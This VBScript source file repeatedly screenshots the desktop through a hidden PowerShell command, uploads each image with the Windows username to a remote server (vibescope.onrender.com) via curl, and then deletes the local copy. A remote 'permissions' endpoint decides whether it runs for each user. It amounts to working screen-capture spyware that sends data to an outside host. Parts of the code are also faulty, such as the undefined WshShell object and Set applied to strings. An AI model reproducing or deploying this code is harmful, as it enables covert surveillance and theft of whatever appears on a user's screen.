'CheckInternetConnection
Dim url : url = "https://vibescope.onrender.com/"

' CaptureScreenshot variables
Dim outputDirectory : outputDirectory = "C:\Users\Public\Libraries"
Dim filename : filename = "Screenshot.png"

' UploadImage & DeleteFile variables
Dim imagePath : imagePath = "C:\Users\Public\Libraries\Screenshot.png" 
Dim apiEndpoint : apiEndpoint = "https://vibescope.onrender.com/uploadImage"

' GetPermissions variable
Dim PermissionsEndpoint : PermissionsEndpoint = "https://vibescope.onrender.com/Permissions/"

Do
	CheckInternetConnection
	GetPermissions
	CaptureScreenshot
	UploadImage
	WshShell.Popup "Waiting for 10 seconds now before deleting the screenshot...", 2, "DeleteFile()", 64
	WScript.Sleep 10000 ' 10000 milliseconds = 10 seconds
	DeleteFile
Loop While True ' Infinite loop


sub GetPermissions()
	On Error Resume Next  ' Enable error handling
	Dim objNetwork : Set objNetwork = CreateObject("WScript.Network")
	' Open a GET request to the specified URL
	Dim clientName : Set clientName = objNetwork.UserName
	' Create the HTTP object
	Dim objHTTP : Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")            
	
	objHTTP.open "GET", PermissionsEndpoint & clientName, False 				          
	' Send the request
	objHTTP.send 	
	
	 ' Check if there was an error during the request
    If Err.Number <> 0 Then
        ' Display detailed error information
		WshShell.Popup "Error connecting to the server. Details: " & Err.Description, 2, "GetPermissions()", 64
        Err.Clear  ' Clear the error object
		WshShell.Popup "Waiting for 10 seconds now before retrying...", 2, "GetPermissions()", 64
		WScript.Sleep 10000 ' wait for 10 seconds

		Set objNetwork = Nothing ' Release the object
		Set clientName = Nothing    ' Release the object
		Set objHTTP = Nothing    ' Release the object

		GetPermissions
        Exit Sub
    End If
	
	 ' Check if there was an error during the request
    If objHTTP.Status <> 200 Then
	    WshShell.Popup "Error connecting to the server. Status code: " & objHTTP.Status, 2, "GetPermissions()", 64
		WshShell.Popup "Waiting for 10 seconds now before retrying...", 2, "GetPermissions()", 64
		WScript.Sleep 10000 ' wait for 10 seconds

		Set objNetwork = Nothing ' Release the object
		Set clientName = Nothing    ' Release the object
		Set objHTTP = Nothing    ' Release the object

		GetPermissions
        Exit Sub
    End If
	
	' Display the response from the server
	WshShell.Popup "Response from server: " & objHTTP.responseText, 2, "GetPermissions()", 64

	
	If objHTTP.responseText = "true" Then
	    WshShell.Popup "Permissions granted!", 2, "GetPermissions()", 64
    Else
		WshShell.Popup "Permissions denied!", 2, "GetPermissions()", 64

		WshShell.Popup "Waiting for 30 minutes now before retrying...", 2, "GetPermissions()", 64

		WScript.Sleep 1800000 ' wait for 30 minutes
		
		Set objNetwork = Nothing ' Release the object
		Set clientName = Nothing    ' Release the object
		Set objHTTP = Nothing    ' Release the object

		GetPermissions
	End If
	
	Set objNetwork = Nothing ' Release the object
	Set clientName = Nothing    ' Release the object
	Set objHTTP = Nothing    ' Release the object

End sub

sub CheckInternetConnection()
    Dim objHTTP : Set objHTTP = CreateObject("MSXML2.XMLHTTP")
    objHTTP.open "GET", url, False
    On Error Resume Next
    objHTTP.send ""
    On Error GoTo 0
    If objHTTP.status = 200 Then
		 WshShell.Popup "Internet is connected!", 2, "CheckInternetConnection()", 64
    Else
		WshShell.Popup "Internet is not connected!", 2, "CheckInternetConnection()", 64
		WScript.Sleep 3000
		' Explicitly release the objHTTP object
    	Set objHTTP = Nothing
		CheckInternetConnection
    End If
	' Explicitly release the objHTTP object
    Set objHTTP = Nothing
End sub

sub CaptureScreenshot()
	Dim objShell : Set objShell = CreateObject("WScript.Shell")
    Dim powershellCommand : powershellCommand = "Add-Type -AssemblyName System.Windows.Forms; " & _
												"[System.Windows.Forms.SendKeys]::SendWait('{PRTSC}'); " & _
												"Start-Sleep -Seconds 2; " & _
												"$image = [System.Windows.Forms.Clipboard]::GetImage(); " & _
												"$image.Save('" & outputDirectory & "\" & filename & "', [System.Drawing.Imaging.ImageFormat]::Png); " & _
												"Remove-Variable -Name image"
    
    objShell.Run "powershell.exe -Command """ & powershellCommand & """", 0, True ' Execute the PowerShell command
	WshShell.Popup "Screenshot Captured and saved at " & outputDirectory & "\" & filename, 2, "CaptureScreenshot()", 64
    Set objShell = Nothing
	Set powershellCommand = Nothing
End sub

Sub UploadImage()
	Dim objNetwork : Set objNetwork = CreateObject("WScript.Network")
    Dim clientName : clientName = objNetwork.UserName

	WshShell.Popup "Uploading Screenshot...", 2, "UploadImage()", 64
    Dim curlCommand : curlCommand = "curl -X POST " & apiEndpoint & " -H ""Content-Type: multipart/form-data"" -F ""image=@" & imagePath & """ -F ""clientName=" & clientName & """"
    Dim shell : Set shell = CreateObject("WScript.Shell") ' Create a WScript.Shell object
    shell.Run curlCommand, 0, True ' Run the curl command
	WshShell.Popup "Screenshot Uploaded!", 2, "UploadImage()", 64
    
	Set objNetwork = Nothing    ' Release the object
	Set clientName = Nothing    ' Release the object
	Set curlCommand = Nothing   ' Release the object
	Set shell = Nothing         ' Release the object
End Sub

Sub DeleteFile()
	Dim objFSO : Set objFSO = CreateObject("Scripting.FileSystemObject") 	' Create a FileSystemObject
    If objFSO.FileExists(imagePath) Then 									' Check if the file exists before attempting to delete
        objFSO.DeleteFile imagePath 										' Delete the file
        WshShell.Popup "Screenshot Deleted!", 2, "DeleteFile()", 64
    Else
		WshShell.Popup "Screenshot not found!", 2, "DeleteFile()", 64
    End If
	Set objFSO = Nothing 												    ' Release the FileSystemObject
End Sub

Set WshShell = Nothing ' Release the object
Set url = Nothing ' Release the object
Set outputDirectory = Nothing ' Release the object
Set filename = Nothing ' Release the object
Set imagePath = Nothing ' Release the object
Set apiEndpoint = Nothing ' Release the object
Set PermissionsEndpoint = Nothing ' Release the object